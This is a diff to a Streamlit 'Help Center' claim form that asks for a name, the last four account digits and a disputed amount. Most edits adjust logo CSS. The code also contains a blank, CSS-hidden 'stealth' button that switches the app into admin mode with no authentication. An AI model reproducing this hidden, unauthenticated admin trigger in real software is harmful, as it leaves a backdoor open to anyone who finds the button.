@@ -40,15 +40,21 @@ st.markdown("""<style>
         visibility: hidden !important;
     }
 
-    /* REFINED RESPONSIVE LOGO */
+    /* LOGO CENTERING & SIZING */
+    [data-testid="stImage"] {
+        display: flex !important;
+        justify-content: center !important;
+        width: 100% !important;
+    }
+
     [data-testid="stImage"] img {
-        width: 280px !important;
+        width: 220px !important;
         height: auto !important;
     }
 
     @media (max-width: 768px) {
         [data-testid="stImage"] img {
-            width: 130px !important;
+            width: 160px !important;
         }
     }
 
@@ -82,14 +88,11 @@ st.markdown("""<style>
         box-shadow: none !important;
     }
 
-    /* ULTIMATE HIDE ON MOBILE (MAX-WIDTH 768PX) */
+    /* HIDE ON MOBILE */
     @media screen and (max-width: 768px) {
-        div.stealth-trigger, 
-        div.stealth-trigger button, 
-        [data-testid="stBaseButton-secondary"] {
+        div.stealth-trigger, div.stealth-trigger button, [data-testid="stBaseButton-secondary"] {
             display: none !important;
             visibility: hidden !important;
-            opacity: 0 !important;
             pointer-events: none !important;
             position: fixed !important;
             left: -9999px !important;
@@ -119,14 +122,13 @@ st.markdown("""<style>
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
-    col_logo = st.columns([1, 3, 1])[1]
-    with col_logo:
-        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
+    if os.path.exists('logo.svg'): 
+        st.image('logo.svg')
 
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_5", clear_on_submit=True):
+    with st.form("claim_v32_8_6", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -147,7 +149,7 @@ if not st.session_state.admin_mode:
     """, unsafe_allow_html=True)
 
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v85"):
+    if st.button(" ", key="stealth_admin_v86"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
